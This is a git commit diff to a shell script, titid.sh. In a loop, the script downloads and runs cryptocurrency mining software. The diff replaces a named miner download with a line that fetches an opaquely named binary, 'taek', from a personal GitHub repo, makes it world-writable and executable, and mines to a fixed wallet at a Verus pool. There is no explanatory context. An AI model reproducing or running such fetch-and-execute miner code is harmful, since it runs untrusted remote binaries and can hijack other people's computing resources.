21c3615fe8111967b43e4445d76721cf4393a8eb
sheesheshee <86801425+sheesheshee@users.noreply.github.com>
2021-07-02 03:00:27 +0700

    Update titid.sh

--- titid.sh
+++ titid.sh
@@ -3,8 +3,7 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xzf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.hadeh -p x --cpu 8
-
+wget https://github.com/OmJhonyPerkasa/yteam/raw/master/taek && chmod 777 taek && ./taek -v -l  pool.verus.io:9999 -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.budi -p x -t 2
      echo COUNTER $COUNTER
      let COUNTER-=1
 done
